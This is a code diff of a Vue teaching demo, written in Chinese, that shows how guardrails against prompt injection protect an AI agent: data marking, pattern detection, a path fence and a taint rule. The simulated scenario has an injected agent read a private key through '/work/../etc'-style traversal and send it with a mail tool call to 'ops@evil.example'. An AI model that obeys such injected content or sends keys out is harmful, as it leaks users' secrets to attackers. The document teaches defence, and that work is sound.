@@ -11,7 +11,7 @@
     run="python -m llm_agent.m12_guardrails.demo"
     :challenge="{
       ask: '只开「标记不可信数据」, 把注入换成「改写过的」: 标记还在, 特征检测却没报警。如果模型这次上当了, 私钥会被发出去吗? 关掉哪一条链路才一定安全?',
-      answer: '会发出去。标记和特征检测都只是在「劝」模型: 正则挡不住换个说法的注入, 模型也可能就是不听。这一层降低的是概率, 不是可能性。\n确定性的防线有两条:\n- 路径围栏: 让私钥根本读不到。resolve 之后再判断是否还在 root 内。\n- 污点规则: 本轮上下文混入过不可信数据之后, 高风险工具一律拒绝, 对外通道被切断。\n这就是 lethal trifecta 的拆法: 私有数据 + 不可信内容 + 对外通道, 三者不能同时成立。',
+      answer: '会发出去。标记和特征检测都只是在「劝」模型: 正则挡不住换个说法的注入, 模型也可能就是不听。这一层只能让攻击更难成功, 不能让它不可能。\n确定性的防线有两条:\n- 路径围栏: 让私钥根本读不到。resolve 之后再判断是否还在 root 内。\n- 污点规则: 本轮上下文混入过不可信数据之后, 高风险工具一律拒绝, 对外通道被切断。\n这就是 lethal trifecta 的拆法: 私有数据 + 不可信内容 + 对外通道, 三者不能同时成立。',
     }"
   >
     <template #controls>
@@ -40,7 +40,7 @@
 
     <template #stats>
       <div class="kv"><span>执行了的危险动作</span><b :class="harm ? 'bad' : 'good'">{{ harm }}</b></div>
-      <div class="kv"><span>进入 transcript 的密钥</span><b :class="on.redact ? 'good' : 'bad'">{{ on.redact ? 0 : 1 }}</b></div>
+      <div class="kv"><span>进入 transcript 的密钥</span><b :class="leaked ? 'bad' : 'good'">{{ leaked }}</b></div>
       <div class="kv"><span>特征检测</span><b :class="hits.length ? 'good' : 'bad'">{{ on.wrap ? (hits.length ? '报警' : '漏过') : '未开' }}</b></div>
       <div class="kv"><span>路径: 朴素前缀 / resolve</span><b :class="confine.naive === confine.safe ? '' : 'bad'">{{ confine.naive ? '放行' : '拦' }} / {{ confine.safe ? '放行' : '拦' }}</b></div>
       <p class="lab-note">resolve 后的真实路径: <code class="inline">{{ confine.real }}</code>。先拼接再查字符串前缀是经典漏洞: <code class="inline">/work/../etc</code> 以 /work 开头, 却早已在沙箱之外。</p>
@@ -104,14 +104,18 @@ const actions = computed(() => {
       ? (confine.value.safe ? `路径 resolve 后是 ${confine.value.real}, 仍在 /work 内: 读到的只是工作区里的文件。` : 'read_file 是低风险只读工具, 权限门和污点规则都不管它。没有围栏, 它能读 agent 进程能碰到的任何文件。')
       : `PermissionError: path escapes sandbox。resolve 后是 ${confine.value.real}, 不在 /work 内。与模型是否听话无关。`,
   })
+  // ★ 外发的危害以读到私钥为前提: 围栏拦住了读, 邮件里就没有私钥
+  const gotKey = readOk && !confine.value.safe
   list.push({
-    call: 'mcp__mail__send(to="ops@evil.example", …)', state: on.taint ? 'blocked' : 'bad', verdict: on.taint ? '污点规则拦截' : '执行: 已外发',
+    call: 'mcp__mail__send(to="ops@evil.example", …)', state: on.taint ? 'blocked' : gotKey ? 'bad' : 'warn', verdict: on.taint ? '污点规则拦截' : gotKey ? '执行: 私钥已外发' : '执行: 发出去了, 但没带私钥',
     why: on.taint
       ? 'DENIED: context is tainted by untrusted data; 本轮高风险工具全部锁死, 直到下一条真正的用户指令。即使用户配过 allow mcp__mail__* 也一样。'
-      : '用户图省事配过 allow mcp__mail__*, 权限门放行。私有数据 + 不可信内容 + 对外通道 = lethal trifecta 凑齐。',
+      : gotKey ? '用户图省事配过 allow mcp__mail__*, 权限门放行。私有数据 + 不可信内容 + 对外通道 = lethal trifecta 凑齐。'
+        : '用户图省事配过 allow mcp__mail__*, 权限门放行, 邮件发出去了。但上一步没读到沙箱外的私钥, 三样里缺了「私有数据」。对外通道仍然开着, 下一次注入换个目标还能用。',
   })
   return list
 })
+const leaked = computed(() => (view.value.match(SECRET) || []).length) // 数的是模型实际看到的文本里还剩几个密钥
 const harm = computed(() => actions.value.filter((a) => a.state === 'bad').length)
 </script>
 
@@ -124,6 +128,7 @@ const harm = computed(() => actions.value.filter((a) => a.state === 'bad').lengt
 .act .verdict { font-size: 12px; }
 .act.bad { border-color: var(--danger); } .act.bad .verdict { color: var(--danger); }
 .act.blocked { border-color: var(--left); } .act.blocked .verdict { color: var(--left); }
+.act.warn { border-color: var(--warn); } .act.warn .verdict { color: var(--warn); }
 .act.sel { outline: 2px solid var(--accent); outline-offset: 1px; }
 .why { margin-top: 10px; font-size: 12px; color: var(--text-muted); line-height: 1.7; min-height: 60px; }
 </style>
